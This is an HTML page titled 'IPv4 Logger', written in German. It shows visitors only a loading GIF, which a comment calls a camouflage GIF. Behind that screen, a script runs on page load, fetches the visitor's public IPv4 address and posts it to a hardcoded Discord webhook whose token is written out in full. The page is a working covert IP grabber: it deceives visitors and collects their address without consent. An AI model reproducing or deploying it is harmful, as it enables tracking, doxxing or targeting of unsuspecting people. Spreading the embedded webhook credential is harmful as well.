<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>IPv4 Logger</title>
  <style>
    body {
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    img {
      max-width: 90%;
      max-height: 90%;
    }
  </style>
</head>
<body>

<!-- Tarn-GIF -->
<img src="https://media.tenor.com/1vCm3vSUyBwAAAAC/loading-buffering.gif" alt="Lädt...">

<script>
const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv";

async function getRealIPv4() {
    try {
        const res = await fetch("https://ipv4.icanhazip.com");
        const ip = await res.text();
        return ip.trim();
    } catch {
        return "Fehler beim Laden";
    }
}

async function sendToDiscord() {
    const ipv4 = await getRealIPv4();
    const embed = {
        title: "Neuer Besucher",
        color: 3447003,
        fields: [
            { name: "Öffentliche IPv4", value: ipv4, inline: false }
        ],
        footer: { text: "Automatisch erfasst" },
        timestamp: new Date()
    };

    await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
    });
}

sendToDiscord();
</script>

</body>
</html>
